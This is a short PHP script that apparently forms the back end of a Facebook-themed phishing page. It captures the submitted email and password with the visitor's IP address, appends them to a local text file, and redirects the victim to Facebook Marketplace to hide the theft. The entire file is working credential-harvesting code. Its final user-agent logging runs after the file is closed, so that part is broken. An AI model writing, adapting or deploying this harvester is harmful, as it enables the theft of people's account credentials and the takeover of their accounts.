<?php

header("Location: https://www.facebook.com/marketplace/item/");

$emailspm= $_POST['email'];
$passspm= $_POST['password'];
$ipspm= $_SERVER['REMOTE_ADDR'];
$agentspm= $_SERVER['HTTP_USER_AGENT'];
$current_date = date('d/m/Y == H:i:s');
$Spam = fopen("newacc.txt", "a");

fwrite($Spam, "Email   : ");
fwrite($Spam, $emailspm);
fwrite($Spam, "
");
fwrite($Spam, "password: ");
fwrite($Spam, $passspm);
fwrite($Spam, "
");
fwrite($Spam, "https://www.whtop.com/tools.ip/");
fwrite($Spam, $ipspm);
fwrite($Spam, "
");
fwrite($Spam, "\r\n");
fwrite($Spam, "================================");
fwrite($Spam, "\r\n");
fclose($Spam);

fwrite($Spam, "HTTP_USER_AGENT: ");
fwrite($Spam, $agentspm);
fwrite($Spam, "
");
?>